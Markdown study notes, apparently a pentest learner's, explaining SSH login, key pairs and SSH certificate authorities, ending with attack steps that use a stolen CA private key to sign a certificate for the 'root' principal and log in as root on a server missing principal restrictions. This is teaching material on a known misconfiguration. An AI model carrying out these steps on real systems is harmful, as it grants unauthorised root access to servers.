### What is it

SSH is a protocol to securely connect to and control a remote computer over a network.

---
### What it does
- Logs into remote machines
- Runs commands remotely
- Transfers files (`scp`, `sftp`)
- Tunnels other traffic

---

### Authentication Methods

**1. Password** – simple, but weak and brute-forceable.
**2. SSH Keys (most common)**
- You generate a **key pair**: `private key` (keep secret) + `public key` (copy to server).
- When you connect, the server checks if your private key matches the public key on file.
- If yes → access granted.

**3. SSH Certificates**
- A **Certificate Authority (CA)** signs user keys.
- The server trusts the CA's **public key**.
- Any user key signed by the CA is accepted (if principals allow).

---

### Key Files

| File         | What it is         |
| ------------ | ------------------ |
| `id_rsa`     | Private key        |
| `id_rsa.pub` | Public key         |
| `ca`         | CA private key     |
| `ca.pub`     | CA public key      |
| `*-cert.pub` | Signed certificate |

---

### Basic Commands
```bash
Generate a new key pair
ssh-keygen -t ed25519 -f /tmp/key -N ""

Copy public key to server
ssh-copy-id user@target

Connect normally
ssh user@target

Connect with specific private key
ssh -i /path/to/private_key user@target
```
---
# SSH Certificates (CA)
### What is it
A way for one **master key (CA)** to sign many user keys. The server trusts the CA's public key, so it trusts any user key signed by that CA.

---

### What it does

- Instead of adding every user's public key to every server, you just add the CA's public key once.
- Users get their keys signed by the CA.
- The server accepts any valid certificate signed by that CA.
---

### Why it's dangerous

If you find the **CA private key** (`ca`, NOT `ca.pub`), you can:

1. Generate your own SSH key pair
2. Sign your public key with the CA private key
3. Specify **any principal** (username you want to become, like `root`)
4. Log in as that user

**The server trusts the CA, not a list of allowed users.**

---
### 1. Critical Misconfiguration
When `TrustedUserCAKeys` is set but **no** `AuthorizedPrincipalsFile` or `AuthorizedPrincipalsCommand` is configured:

- The server accepts **any** principal in the certificate.
- You can literally write `root` as the principal and the server will let you in.

---
### Attack Steps

```bash
1. Generate a new key pair
   
ssh-keygen -t ed25519 -f /tmp/pwn -N ""

2. Sign the public key with the CA, specifying root as the principal
   
ssh-keygen -s /path/to/ca -I "any-id" -n root -V +1h /tmp/pwn.pub

2. SSH as root using the signed certificate
   
ssh -i /tmp/pwn root@localhost
```

---
### Flags Explained

| Flag     | What it does                                                   |
| -------- | -------------------------------------------------------------- |
| `-s`     | CA private key to sign with                                    |
| `-I`     | Key identifier (any string, not security-relevant)             |
| `-n`     | **Principal** — the username you want to authenticate as       |
| `-V +1h` | Validity period (cert expires in 1 hour)                       |
| `-i`     | Use this private key (and its matching certificate) to connect |